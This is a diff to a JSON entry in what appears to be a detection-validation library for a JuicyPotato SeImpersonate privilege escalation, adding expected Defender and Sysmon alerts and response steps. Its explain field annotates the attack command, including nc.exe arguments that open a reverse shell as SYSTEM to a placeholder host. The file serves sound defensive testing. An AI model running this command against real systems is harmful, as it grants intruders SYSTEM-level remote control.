@@ -162,6 +162,30 @@
         "defender-endpoint",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "defender-endpoint",
+          "description": "SeImpersonate - JuicyPotato to SYSTEM - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "description": "proc_creation_win_hktl_juicypotato"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review Microsoft Defender for Endpoint, Sysmon for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Abuses SeImpersonatePrivilege via DCOM/BITS to capture a SYSTEM token (JuicyPotato):\n  JuicyPotato.exe          the potato exploit\n  -l 53375                 the local COM server port it listens on\n  -p c:\\windows\\system32\\cmd.exe   the program to launch as SYSTEM\n  -a \"/c c:\\tools\\nc.exe <lhost> <lport> -e cmd.exe\"   its arguments (here a reverse shell)\n  -t *                     try both token-creation methods\nWorks on pre-2019 Windows; use PrintSpoofer/GodPotato on newer builds."
